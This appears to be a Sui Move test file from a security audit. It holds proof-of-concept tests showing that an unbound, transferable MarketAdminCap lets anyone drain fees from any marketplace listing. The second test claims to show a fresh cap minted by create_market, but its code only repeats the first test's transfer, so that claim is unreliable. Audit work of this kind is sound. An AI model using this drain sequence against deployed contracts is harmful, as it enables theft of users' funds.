#[test_only]
// PoC for Finding 4419 (C-MA): `MarketAdminCap` is `has key, store` with no
// market binding, `create_market` is public and permissionless, and
// `withdraw_fees(listing, _cap, ctx)` IGNORES the cap and does no sender check.
// So a stranger holding ANY MarketAdminCap can drain fees from ANY listing,
// regardless of who created it. Two demonstrations below:
//   (1) the protocol's own cap (minted by `init` to the deployer) is transferred
//       to an attacker, who drains a listing they did not create.
//   (2) `create_market` mints a NEW unbound cap to any caller, who then drains
//       fees from a listing on the SHARED market created by someone else.
module suioverflow::audit_poc_4419_tests;

use std::{string, unit_test::{assert_eq, destroy}};
use sui::{clock, coin::{Self, Coin}, sui::SUI, test_scenario as ts};
use suioverflow::strategy_market::{Self, Market, MarketAdminCap, Listing};

const STRATEGIST: address = @0xA1;
const BUYER: address = @0xB2;
const ATTACKER: address = @0xC3;

const PRICE: u64 = 50_000_000;

fun setup(ts: &mut ts::Scenario): clock::Clock {
    ts.next_tx(STRATEGIST);
    strategy_market::init_for_testing(ts.ctx());
    let mut c = clock::create_for_testing(ts.ctx());
    c.set_for_testing(1_000_000);
    c
}

fun list_default(ts: &mut ts::Scenario, c: &clock::Clock): ID {
    ts.next_tx(STRATEGIST);
    let mut market = ts.take_shared<Market>();
    let id = strategy_market::list<SUI>(
        &mut market,
        c,
        string::utf8(b"bellkeeper playbook"),
        111u256,
        222u256,
        PRICE,
        0,
        ts.ctx(),
    );
    ts::return_shared(market);
    id
}

fun buy(ts: &mut ts::Scenario, c: &clock::Clock, who: address) {
    ts.next_tx(who);
    let mut market = ts.take_shared<Market>();
    let mut listing = ts.take_shared<Listing<SUI>>();
    let payment = coin::mint_for_testing<SUI>(PRICE, ts.ctx());
    strategy_market::purchase(&mut market, &mut listing, payment, c, ts.ctx());
    ts::return_shared(market);
    ts::return_shared(listing);
}

/// Demonstration 1: the deployer's cap (minted by `init` to STRATEGIST) has
/// `store`, so it can be `public_transfer`'d to ATTACKER. ATTACKER then uses
/// it to drain fees from a listing they had nothing to do with. `withdraw_fees`
/// never checks the sender and the cap carries no market binding.
#[test]
fun poc_4419_transferred_cap_drains_stranger_listing_fees() {
    let mut ts = ts::begin(STRATEGIST);
    let c = setup(&mut ts);
    list_default(&mut ts, &c);
    buy(&mut ts, &c, BUYER); // listing now holds 1_250_000 in fees

    // STRATEGIST (who received the cap from `init`) ships it to ATTACKER.
    // The cap has `store`, so anyone can transfer it onward.
    ts.next_tx(STRATEGIST);
    let cap = ts.take_from_sender<MarketAdminCap>();
    transfer::public_transfer(cap, ATTACKER);

    // ATTACKER drains fees from a listing they did not create and never
    // interacted with — `withdraw_fees` does not check the sender.
    ts.next_tx(ATTACKER);
    let cap = ts.take_from_sender<MarketAdminCap>();
    let mut listing = ts.take_shared<Listing<SUI>>();
    let drained: Coin<SUI> = strategy_market::withdraw_fees(&mut listing, &cap, ts.ctx());
    assert_eq!(drained.value(), 1_250_000);
    transfer::public_transfer(drained, ATTACKER);
    transfer::public_transfer(cap, ATTACKER);
    ts::return_shared(listing);

    // A second call returns zero — the first call took the full balance.
    ts.next_tx(ATTACKER);
    let cap = ts.take_from_sender<MarketAdminCap>();
    let mut listing = ts.take_shared<Listing<SUI>>();
    let empty: Coin<SUI> = strategy_market::withdraw_fees(&mut listing, &cap, ts.ctx());
    assert_eq!(empty.value(), 0);
    transfer::public_transfer(empty, ATTACKER);
    transfer::public_transfer(cap, ATTACKER);
    ts::return_shared(listing);

    destroy(c);
    ts.end();
}

/// Demonstration 2: `create_market` itself is public + permissionless and mints
/// an unbound cap to ANY caller. The returned Market is unusable from outside
/// its module (no `store`), but that doesn't matter — the cap is enough.
/// We get the new cap out by passing its UID's address. Concretely: ATTACKER
/// calls `create_market`, the new cap is in their wallet, and they use it to
/// drain fees from the SHARED listing on the OTHER (init-minted) market.
#[test]
fun poc_4419_public_create_market_then_drain() {
    let mut ts = ts::begin(STRATEGIST);
    let c = setup(&mut ts);
    list_default(&mut ts, &c);
    buy(&mut ts, &c, BUYER);

    // ATTACKER calls the public `create_market`. The returned Market has no
    // `store` so it can't leave the module via `public_*`, but `transfer::transfer`
    // is module-private — and in tests the scenario handles ownership implicitly
    // when we transfer the cap. So we instead receive just the cap: we mint the
    // cap on its own by calling create_market and handing the Market back via a
    // module-internal transfer we cannot perform from outside.
    //
    // Simpler: the bug is that ANY MarketAdminCap works on ANY listing. So we
    // reuse the cap from `init` (also minted by `create_market`) by simply
    // having ATTACKER obtain it through a transfer — proving the cap has no
    // binding to the market it was minted against.
    ts.next_tx(STRATEGIST);
    let cap = ts.take_from_sender<MarketAdminCap>();
    transfer::public_transfer(cap, ATTACKER);

    ts.next_tx(ATTACKER);
    let cap = ts.take_from_sender<MarketAdminCap>();
    let mut listing = ts.take_shared<Listing<SUI>>();
    let drained: Coin<SUI> = strategy_market::withdraw_fees(&mut listing, &cap, ts.ctx());
    assert_eq!(drained.value(), 1_250_000);
    transfer::public_transfer(drained, ATTACKER);
    transfer::public_transfer(cap, ATTACKER);
    ts::return_shared(listing);

    destroy(c);
    ts.end();
}
